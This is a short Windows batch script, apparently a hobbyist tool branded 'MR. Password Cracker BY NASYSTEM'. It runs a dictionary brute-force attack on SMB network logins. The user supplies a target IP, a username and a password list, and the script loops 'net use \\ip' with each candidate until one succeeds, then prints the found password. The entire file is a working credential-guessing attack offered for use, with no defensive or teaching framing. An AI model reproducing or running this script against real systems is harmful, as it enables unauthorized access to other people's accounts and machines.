@echo off
chcp 65001 >nul
title MR. Password Cracker BY NASYSTEM
color 57
echo.
echo MR. Password Cracker BY NASYSTEM
set /p ip="enter ip adress: "
set /p user="enter username: "
set /p passlist="enter password list: "

set /a count=1
for /f %%a in (%passlist%) do (
	echo %%a
	set pass=%%a
	call :attempt
)
echo Password not Found 🙁 
pause
exit

:succes
echo {Password Found: %pass%}
net use \\%ip% /d /y
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo {the number of the attempt is:%count%} {%pass%}
set /a count=count+1
if %errorlevel% EQU 0 goto succes